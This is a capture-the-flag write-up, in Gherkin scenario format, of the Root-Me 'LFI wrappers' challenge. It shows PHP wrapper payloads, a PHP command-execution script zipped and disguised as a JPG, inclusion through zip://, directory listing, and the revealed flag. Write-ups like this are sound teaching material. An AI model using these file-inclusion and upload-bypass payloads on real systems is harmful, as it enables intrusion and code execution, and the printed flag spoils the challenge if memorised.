## Version 2.0
## language: en

Feature: lfi-wrappers-web-server-rootme
  Site:
    https://www.root-me.org/
  Category:
    web-server
  User:
    dalvarez
  Goal:
    Retrieve the flag

  Background:
  Hacker's software:
    | <Software name> |    <Version>     |
    | Windows         | 10.0.1809 (x64)  |
    | Chrome          | 75.0.3770.142    |
  Machine information:
    Given the challenge URL
    """
    http://challenge01.root-me.org/web-serveur/ch43/
    """
    When I open the url with Chrome
    Then I see a service to upload images
    And the button to select the image from the computer
    And It only accepts files JPG extension

  Scenario: Fail:PHP-wrappers
    Given I upload an image
    And It renders it through the "view" URL parameter
    When I try with these wrappers to see the index source code:
    """
    php://filter/read=convert.base64-encode/resource=index
    php://input&cmd=cat%20index.php
    glob:///index.php
    """
    Then I get this message:
    """
    Attack detected
    """
    And I could not capture the flag

   Scenario: Fail:PHP-zip-wrapper
    Given the service blocks the previous wrappers
    When I create the php script to make a reverse shell:
    """
    <pre><?php system('cat index.php');?></pre>
    """
    And I compress the file with zip
    And knowing the service expects JPG files
    And changing the zip extension to jpg
    When I upload the file
    Then the file is uploaded successfully
    When I try to execute the script with:
    """
    zip://tmp/upload/m70M29ZS2.jpg%23shell
    """
    Then I get the message:
    """
    page name too long
    """
    When I change the file name to a shorter one
    Then I get the message:
    """
    Warning: system() has been disabled for security reasons in tmp/upload/
    7hAK4uG4d.jpg#s.php on line 1
    """
    When I change the script to:
    """
    <pre><?php echo file_get_contents("index.php");?></pre>
    """
    Then I get the PHP code from the service:
    """
    Attack detected";
    if(strstr($p,"..") !== FALSE)
      die("$haq");
    if(stristr($p,"http") !== FALSE)
      die("$haq");
    if(stristr($p,"ftp") !== FALSE)
      die("$haq");
    if(stristr($p,"php") !== FALSE)
      die("$haq");
    if(strlen($p) > 33)
      die("page name too long");
    if(isset($p))
      $inc = sprintf("%s.php",$p);
    if(isset($inc))
      include($inc);
    }
    ?>
    """
    But I don't see any flag
    And I could not solve the challenge

   Scenario: Success:PHP-list-files
    Given I finally execute PHP code in the server
    When I create the php script to list files:
    """
    <pre>
      <?php
      $files = scandir("./");
      print_r($files);
      ?>
    </pre>
    """
    Then I get an array with:
    """
    Array
    (
    [0] => .
    [1] => ..
    [2] => ._nginx.http-level.inc
    [3] => ._nginx.server-level.inc
    [4] => ._php-fpm.pool.inc
    [5] => ._run
    [6] => flag-mipkBswUppqwXlq9ZydO.php
    [7] => index.php
    [8] => tmp
    [9] => upload.php
    [10] => view.php
    )
    """
    And there is "flag-mipkBswUppqwXlq9ZydO.php"
    When I get the "flag-mipkBswUppqwXlq9ZydO.php" content
    Then I get the flag as a comment in the source code:
    """
    <pre>
    <!--?php
      $flag="lf1-Wr4pp3r_Ph4R_pwn3d";
    ?-->
    </pre>
    """
    And I solve the challenge
